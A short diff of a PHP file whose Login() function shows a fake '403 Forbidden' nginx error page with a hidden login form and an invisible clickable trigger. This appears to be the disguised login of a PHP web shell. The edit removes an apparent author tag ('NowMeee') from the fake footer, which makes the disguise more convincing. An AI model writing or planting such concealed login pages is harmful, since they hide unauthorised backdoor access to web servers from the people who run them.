@@ -5,7 +5,7 @@ function Login() {
     die("<html>
     <title>403 Forbidden</title>
     <center><h1>403 Forbidden</h1></center>
-    <hr><center>nginx (apache v.168 NowMeee) </center>
+    <hr><center>nginx (apache v.168) </center>
     <center>
     <div style='cursor:pointer;'></div>
     <form id='login-form' method='post' style='display:none;'>
@@ -73,3 +73,4 @@ if (is_logged_in()) {
     }
 }
 ?>
+
